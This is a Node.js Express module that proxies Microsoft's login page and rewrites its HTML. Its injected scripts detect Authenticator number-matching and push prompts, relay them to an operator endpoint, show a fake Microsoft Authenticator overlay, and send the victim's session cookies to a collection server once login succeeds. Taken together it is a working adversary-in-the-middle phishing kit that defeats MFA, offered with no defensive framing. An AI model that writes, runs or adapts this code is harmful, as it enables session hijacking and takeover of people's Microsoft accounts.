const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cheerio = require('cheerio');
const zlib = require('zlib');
const { setMFAStatus } = require('./mfa-status');

const router = express.Router();

// Proxy Microsoft login with MFA interception
const microsoftProxy = createProxyMiddleware({
  target: 'https://login.microsoftonline.com',
  changeOrigin: true,
  pathRewrite: {
    '^/ms-login': ''
  },
  selfHandleResponse: true,
  onProxyRes: function (proxyRes, req, res) {
    const chunks = [];
    
    proxyRes.on('data', function (chunk) {
      chunks.push(chunk);
    });
    
    proxyRes.on('end', function () {
      let buffer = Buffer.concat(chunks);
      const encoding = proxyRes.headers['content-encoding'];
      
      // Decompress if needed
      if (encoding === 'gzip') {
        buffer = zlib.gunzipSync(buffer);
      } else if (encoding === 'deflate') {
        buffer = zlib.inflateSync(buffer);
      }
      
      let body = buffer.toString('utf8');
      
      // Inject scripts for HTML responses
      const contentType = proxyRes.headers['content-type'] || '';
      if (contentType.includes('text/html')) {
        // Inject MFA handler if needed
        if (body.includes('displaySign') || body.includes('PhoneAppNotification')) {
          body = injectMFAHandler(body, req.query.userId);
        }
        
        // Always inject cookie capture script
        body = injectCookieCapture(body, req.query.userId);
      }
      
      // Copy headers and remove compression headers since we're sending uncompressed
      const headers = { ...proxyRes.headers };
      delete headers['content-encoding'];
      delete headers['content-length'];
      
      res.writeHead(proxyRes.statusCode, headers);
      res.end(body);
    });
  }
});

function injectMFAHandler(html, userId) {
  const $ = cheerio.load(html);
  
  // Inject MFA detection script
  const mfaScript = `
    <script>
      const userId = '${userId}';
      
      // Check for number matching
      function checkNumberMatching() {
        const numberElement = document.querySelector('[data-testid="displaySign"]');
        if (numberElement) {
          const number = numberElement.textContent.trim();
          fetch('/mfa/update-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, status: 'number_matching', number })
          });
          
          // Show custom overlay
          showMFAOverlay('number_matching', number);
          return true;
        }
        return false;
      }
      
      // Check for push notification
      function checkPushNotification() {
        const pushElement = document.querySelector('[data-bind*="PhoneAppNotification"]');
        if (pushElement) {
          fetch('/mfa/update-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, status: 'push_notification' })
          });
          
          showMFAOverlay('push_notification');
          return true;
        }
        return false;
      }
      
      // Show custom MFA overlay
      function showMFAOverlay(type, number = null) {
        const overlay = document.createElement('div');
        overlay.id = 'mfa-overlay';
        overlay.style.cssText = \`
          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(0,0,0,0.8); z-index: 10000; display: flex;
          justify-content: center; align-items: center;
        \`;
        
        const content = document.createElement('div');
        content.style.cssText = \`
          background: white; padding: 40px; border-radius: 8px;
          text-align: center; max-width: 400px; font-family: 'Segoe UI', sans-serif;
        \`;
        
        if (type === 'number_matching' && number) {
          content.innerHTML = \`
            <h2>Microsoft Authenticator</h2>
            <p>Enter this number in your app:</p>
            <div style="font-size: 48px; font-weight: bold; color: #0078d4; 
                        background: #f3f2f1; padding: 20px; border-radius: 8px; 
                        margin: 20px 0; letter-spacing: 8px;">\${number}</div>
            <div style="display: flex; align-items: center; justify-content: center;">
              <div style="width: 20px; height: 20px; border: 3px solid #f3f3f1; 
                          border-top: 3px solid #0078d4; border-radius: 50%; 
                          animation: spin 1s linear infinite; margin-right: 10px;"></div>
              <span>Waiting for approval...</span>
            </div>
          \`;
        } else {
          content.innerHTML = \`
            <h2>Microsoft Authenticator</h2>
            <p>Approve the notification on your phone</p>
            <div style="display: flex; align-items: center; justify-content: center;">
              <div style="width: 20px; height: 20px; border: 3px solid #f3f3f1; 
                          border-top: 3px solid #0078d4; border-radius: 50%; 
                          animation: spin 1s linear infinite; margin-right: 10px;"></div>
              <span>Waiting for approval...</span>
            </div>
          \`;
        }
        
        // Add CSS animation
        const style = document.createElement('style');
        style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
        document.head.appendChild(style);
        
        overlay.appendChild(content);
        document.body.appendChild(overlay);
        
        // Monitor for completion
        const checkCompletion = setInterval(() => {
          if (window.location.href.includes('myaccount.microsoft.com') || 
              window.location.href.includes('account.microsoft.com') ||
              window.location.href.includes('outlook.office.com') ||
              !document.querySelector('[data-testid="displaySign"]')) {
            
            fetch('/mfa/update-status', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ userId, status: 'completed' })
            });
            
            overlay.remove();
            clearInterval(checkCompletion);
          }
        }, 2000);
      }
      
      // Start monitoring after page load
      setTimeout(() => {
        if (!checkNumberMatching()) {
          checkPushNotification();
        }
      }, 1000);
      
      // Continue monitoring for dynamic content
      const observer = new MutationObserver(() => {
        if (!checkNumberMatching()) {
          checkPushNotification();
        }
      });
      
      observer.observe(document.body, { childList: true, subtree: true });
    </script>
  `;
  
  $('body').append(mfaScript);
  return $.html();
}

function injectCookieCapture(html, userId) {
  const $ = cheerio.load(html);
  
  const cookieCaptureScript = `
    <script>
      // Store userId for cookie capture
      if ('${userId}') {
        sessionStorage.setItem('userId', '${userId}');
      }
      
      // Cookie capture logic
      (function() {
        function checkAndCapture() {
          const isAuthSuccess = window.location.href.includes('account.microsoft.com') ||
                               window.location.href.includes('outlook.office.com') ||
                               window.location.href.includes('myaccount.microsoft.com') ||
                               document.cookie.includes('ESTSAUTH');
          
          if (isAuthSuccess) {
            const userId = '${userId}' || sessionStorage.getItem('userId');
            if (userId) {
              captureCookies(userId);
            }
          }
        }
        
        function captureCookies(userId) {
          const cookies = document.cookie.split(';').map(cookie => {
            const [name, ...valueParts] = cookie.trim().split('=');
            return {
              name: name,
              value: valueParts.join('='),
              domain: window.location.hostname,
              path: '/',
              secure: window.location.protocol === 'https:',
              httpOnly: false
            };
          }).filter(c => c.name && c.value);
          
          fetch('http://localhost:8000/session/submit/' + userId, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies }),
            mode: 'cors'
          }).then(r => r.json()).then(data => {
            if (data.success) {
              console.log('✅ Cookies captured:', data.cookieCount);
            }
          }).catch(e => console.log('Cookie capture error:', e));
        }
        
        // Check immediately and on URL changes
        checkAndCapture();
        
        // Monitor for navigation changes
        let lastUrl = location.href;
        new MutationObserver(() => {
          const url = location.href;
          if (url !== lastUrl) {
            lastUrl = url;
            setTimeout(checkAndCapture, 1000);
          }
        }).observe(document, { subtree: true, childList: true });
        
        // Also check periodically
        setInterval(checkAndCapture, 5000);
      })();
    </script>
  `;
  
  $('body').append(cookieCaptureScript);
  return $.html();
}

// Update MFA status endpoint (before proxy)
router.post('/update-status', (req, res) => {
  const { userId, status, number } = req.body;
  setMFAStatus(userId, status, number ? { number } : {});
  res.json({ success: true });
});

// Proxy all Microsoft login requests
router.use('/', microsoftProxy);

module.exports = router;